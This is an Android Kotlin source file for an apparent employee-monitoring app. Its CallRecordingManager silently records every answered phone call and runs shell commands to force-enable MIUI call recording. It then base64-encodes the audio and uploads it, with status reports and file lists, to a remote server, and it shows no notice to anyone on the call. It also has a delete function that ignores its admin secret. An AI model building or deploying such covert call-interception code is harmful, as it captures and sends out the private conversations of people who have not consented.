package com.employeemonitor

import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class CallRecordingManager(private val context: Context) {

    companion object {
        private const val TAG = "CallRecordingMgr"
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT

        var isRecording = false
            private set
        var currentRecordingPath: String? = null
            private set
        var recordingStartTime: Long = 0
            private set
        var lastError: String = ""
            private set
        var listenerRegistered = false
            private set
    }

    private var audioRecord: AudioRecord? = null
    private var recordingThread: Thread? = null
    private val shouldRecord = AtomicBoolean(false)
    private var phoneStateListener: Any? = null
    private var wasOnCall = false

    private val executor = Executors.newSingleThreadExecutor()

    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    fun startAutoRecording() {
        if (isRecording) {
            Log.w(TAG, "Already recording")
            return
        }

        enableMiuiNativeRecording()
        setupPhoneStateListener()
        Log.d(TAG, "Auto call recording enabled, listener registered=$listenerRegistered")
        reportStatus("init", "Auto recording enabled, listener=$listenerRegistered")
    }

    private fun enableMiuiNativeRecording() {
        val cmds = listOf(
            arrayOf("settings", "put", "system", "miui_call_recording", "1"),
            arrayOf("settings", "put", "secure", "miui_call_recording", "1"),
            arrayOf("settings", "put", "global", "miui_call_recording", "1"),
            arrayOf("settings", "put", "system", "call_auto_recording", "1"),
            arrayOf("settings", "put", "secure", "call_auto_recording", "1"),
            arrayOf("settings", "put", "global", "auto_call_recording", "1"),
            arrayOf("settings", "put", "system", "auto_call_recording", "1"),
            arrayOf("settings", "put", "system", "miui_in_call_recording_enabled", "1"),
            arrayOf("settings", "put", "secure", "miui_in_call_recording_enabled", "1")
        )
        for (cmd in cmds) {
            try {
                val proc = Runtime.getRuntime().exec(cmd)
                proc.waitFor()
                val err = proc.errorStream.bufferedReader().readText()
                if (err.isNotEmpty()) Log.w(TAG, "Shell cmd error: ${cmd.last()} - $err")
            } catch (e: Exception) {
                Log.w(TAG, "Shell cmd failed: ${cmd.last()} - ${e.message}")
            }
        }
        Log.d(TAG, "MIUI native recording settings applied")
    }

    fun stopAutoRecording() {
        shouldRecord.set(false)
        stopRecording()
        removePhoneStateListener()
        Log.d(TAG, "Auto call recording disabled")
    }

    fun forceStartRecording(): Boolean {
        if (isRecording) return true
        if (hasAudioPermission()) {
            startRecording()
            return true
        }
        lastError = "No RECORD_AUDIO permission"
        Log.e(TAG, lastError)
        reportStatus("error", lastError)
        return false
    }

    fun forceStopRecording(): Boolean {
        if (!isRecording) return true
        stopRecording()
        return true
    }

    @Suppress("DEPRECATION")
    private fun setupPhoneStateListener() {
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    val callback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                        override fun onCallStateChanged(state: Int) {
                            handleCallState(state)
                        }
                    }
                    telephonyManager.registerTelephonyCallback(executor, callback)
                    phoneStateListener = callback
                    listenerRegistered = true
                    Log.d(TAG, "TelephonyCallback registered (API 31+)")
                } catch (e: Exception) {
                    Log.e(TAG, "TelephonyCallback failed: ${e.message}, trying legacy")
                    setupLegacyListener(telephonyManager)
                }
            } else {
                setupLegacyListener(telephonyManager)
            }
        } catch (e: Exception) {
            lastError = "Phone state listener setup failed: ${e.message}"
            Log.e(TAG, lastError)
            reportStatus("error", lastError)
        }
    }

    @Suppress("DEPRECATION")
    private fun setupLegacyListener(telephonyManager: TelephonyManager) {
        try {
            val listener = object : PhoneStateListener() {
                @Deprecated("Deprecated in Java")
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    handleCallState(state)
                }
            }
            telephonyManager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
            phoneStateListener = listener
            listenerRegistered = true
            Log.d(TAG, "Legacy PhoneStateListener registered")
        } catch (e: Exception) {
            lastError = "Legacy listener failed: ${e.message}"
            Log.e(TAG, lastError)
            reportStatus("error", lastError)
        }
    }

    @Suppress("DEPRECATION")
    private fun removePhoneStateListener() {
        try {
            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && phoneStateListener is TelephonyCallback) {
                telephonyManager.unregisterTelephonyCallback(phoneStateListener as TelephonyCallback)
            } else if (phoneStateListener is PhoneStateListener) {
                telephonyManager.listen(phoneStateListener as PhoneStateListener, PhoneStateListener.LISTEN_NONE)
            }

            phoneStateListener = null
            listenerRegistered = false
            Log.d(TAG, "Phone state listener removed")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove phone state listener: ${e.message}")
        }
    }

    private fun handleCallState(state: Int) {
        val stateName = when (state) {
            TelephonyManager.CALL_STATE_IDLE -> "IDLE"
            TelephonyManager.CALL_STATE_RINGING -> "RINGING"
            TelephonyManager.CALL_STATE_OFFHOOK -> "OFFHOOK"
            else -> "UNKNOWN($state)"
        }
        Log.d(TAG, "Call state changed: $stateName (isRecording=$isRecording, hasPerm=${hasAudioPermission()})")
        reportStatus("call_state", stateName)

        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                wasOnCall = true
                if (!isRecording && hasAudioPermission()) {
                    Log.d(TAG, "Starting recording on OFFHOOK...")
                    startRecording()
                } else if (!hasAudioPermission()) {
                    lastError = "No RECORD_AUDIO permission when call started"
                    Log.e(TAG, lastError)
                    reportStatus("error", lastError)
                }
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (wasOnCall) {
                    wasOnCall = false
                    if (isRecording) {
                        stopRecording()
                    }
                }
            }
            TelephonyManager.CALL_STATE_RINGING -> {
                Log.d(TAG, "Call ringing - waiting for answer")
            }
        }
    }

    private fun startRecording() {
        if (isRecording) return

        if (!hasAudioPermission()) {
            lastError = "RECORD_AUDIO permission not granted"
            Log.e(TAG, lastError)
            reportStatus("error", lastError)
            return
        }

        try {
            val dir = File(context.getExternalFilesDir(null), "call_recordings")
            if (!dir.exists()) dir.mkdirs()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val fileName = "call_$timestamp.wav"
            val file = File(dir, fileName)
            currentRecordingPath = file.absolutePath

            val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
            Log.d(TAG, "Buffer size: $bufferSize, trying VOICE_COMMUNICATION first")

            var source = MediaRecorder.AudioSource.VOICE_COMMUNICATION
            audioRecord = AudioRecord(source, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize * 2)

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.w(TAG, "VOICE_COMMUNICATION failed, trying MIC")
                audioRecord?.release()
                audioRecord = null
                source = MediaRecorder.AudioSource.MIC
                audioRecord = AudioRecord(source, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize * 2)
            }

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.w(TAG, "MIC also failed, trying UNPROCESSED")
                audioRecord?.release()
                audioRecord = null
                source = MediaRecorder.AudioSource.UNPROCESSED
                audioRecord = AudioRecord(source, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize * 2)
            }

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                lastError = "All audio sources failed to initialize"
                Log.e(TAG, lastError)
                audioRecord?.release()
                audioRecord = null
                currentRecordingPath = null
                reportStatus("error", lastError)
                return
            }

            shouldRecord.set(true)
            isRecording = true
            recordingStartTime = System.currentTimeMillis()

            audioRecord?.startRecording()

            Log.d(TAG, "Recording started with source=$source, file=$fileName")
            reportStatus("recording_started", "Source: $source, File: $fileName")

            recordingThread = Thread {
                val buffer = ByteArray(bufferSize)
                var outputStream: java.io.FileOutputStream? = null

                try {
                    outputStream = java.io.FileOutputStream(file)
                    while (shouldRecord.get()) {
                        val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                        if (bytesRead > 0) {
                            outputStream.write(buffer, 0, bytesRead)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Recording write error: ${e.message}")
                } finally {
                    try {
                        outputStream?.flush()
                        outputStream?.close()
                    } catch (_: Exception) {}
                }

                val size = file.length()
                Log.d(TAG, "Recording saved: ${file.absolutePath} ($size bytes)")
                if (size > 0) {
                    reportStatus("recording_saved", "Size: $size bytes")
                    uploadRecording(file)
                } else {
                    lastError = "Recording file is empty"
                    reportStatus("error", lastError)
                }
            }.also { it.start() }

        } catch (e: SecurityException) {
            lastError = "SecurityException: ${e.message}"
            Log.e(TAG, lastError)
            isRecording = false
            reportStatus("error", lastError)
        } catch (e: Exception) {
            lastError = "Recording failed: ${e.message}"
            Log.e(TAG, lastError)
            isRecording = false
            reportStatus("error", lastError)
        }
    }

    private fun stopRecording() {
        if (!isRecording) return

        try {
            shouldRecord.set(false)

            try { audioRecord?.stop() } catch (_: Exception) {}
            try { audioRecord?.release() } catch (_: Exception) {}
            audioRecord = null

            recordingThread?.join(3000)
            recordingThread = null

            isRecording = false
            Log.d(TAG, "Call recording stopped")
            reportStatus("recording_stopped", "Stopped")
        } catch (e: Exception) {
            lastError = "Stop failed: ${e.message}"
            Log.e(TAG, lastError)
        }
    }

    private fun reportStatus(type: String, message: String) {
        executor.execute {
            try {
                val empId = DeviceConfig.getEmployeeId(context)
                val serverUrl = DeviceConfig.getServerUrl(context)
                if (empId.isEmpty() || serverUrl.isEmpty()) return@execute

                val json = JSONObject().apply {
                    put("employee_id", empId)
                    put("timestamp", System.currentTimeMillis())
                    put("command", "call_recording_status")
                    put("type", type)
                    put("message", message)
                    put("is_recording", isRecording)
                    put("listener_registered", listenerRegistered)
                    put("last_error", lastError)
                    put("has_permission", hasAudioPermission())
                }.toString()

                val body = json.toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$serverUrl/api/callrecordings/status")
                    .post(body)
                    .build()

                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.w(TAG, "Status report failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.w(TAG, "reportStatus error: ${e.message}")
            }
        }
    }

    private fun uploadRecording(file: File) {
        executor.execute {
            try {
                if (!file.exists() || file.length() == 0L) return@execute

                val empId = DeviceConfig.getEmployeeId(context)
                val serverUrl = DeviceConfig.getServerUrl(context)
                if (empId.isEmpty() || serverUrl.isEmpty()) return@execute

                val bytes = file.readBytes()
                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val durationMs = System.currentTimeMillis() - recordingStartTime

                val json = JSONObject().apply {
                    put("employee_id", empId)
                    put("timestamp", recordingStartTime)
                    put("duration_ms", durationMs)
                    put("file_name", file.name)
                    put("file_path", file.absolutePath)
                    put("file_size", file.length())
                    put("file_base64", base64)
                    put("type", "call_recording")
                }.toString()

                val body = json.toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$serverUrl/api/callrecordings/upload")
                    .post(body)
                    .build()

                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e(TAG, "Recording upload failed: ${e.message}")
                    }
                    override fun onResponse(call: Call, response: Response) {
                        Log.d(TAG, "Recording uploaded: ${response.code}")
                        response.close()
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "uploadRecording failed: ${e.message}")
            }
        }
    }

    fun deleteRecording(filePath: String, adminSecret: String): Boolean {
        val file = File(filePath)
        if (!file.exists()) return false
        if (!file.absolutePath.contains("call_recordings")) return false

        return try {
            file.delete()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun getRecordingsList(): List<JSONObject> {
        val recordings = mutableListOf<JSONObject>()
        val dir = File(context.getExternalFilesDir(null), "call_recordings")
        if (!dir.exists()) return recordings

        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
        dir.listFiles()?.filter { it.isFile && it.extension == "wav" }?.forEach { file ->
            recordings.add(JSONObject().apply {
                put("file_name", file.name)
                put("file_path", file.absolutePath)
                put("file_size", file.length())
                put("size_human", formatFileSize(file.length()))
                put("last_modified", dateFormat.format(Date(file.lastModified())))
            })
        }
        return recordings.sortedByDescending { it.getString("last_modified") }
    }

    fun listRecordings(serverUrl: String, empId: String) {
        val recordings = getRecordingsList()
        val json = JSONObject().apply {
            put("employee_id", empId)
            put("timestamp", System.currentTimeMillis())
            put("total_recordings", recordings.size)
            put("recordings", org.json.JSONArray(recordings))
        }.toString()

        val body = json.toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$serverUrl/api/callrecordings/list")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "List recordings failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Recordings listed: ${response.code}")
                response.close()
            }
        })
    }

    private fun hasAudioPermission(): Boolean {
        return context.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024))
            else -> String.format("%.2f GB", bytes / (1024.0 * 1024 * 1024))
        }
    }
}
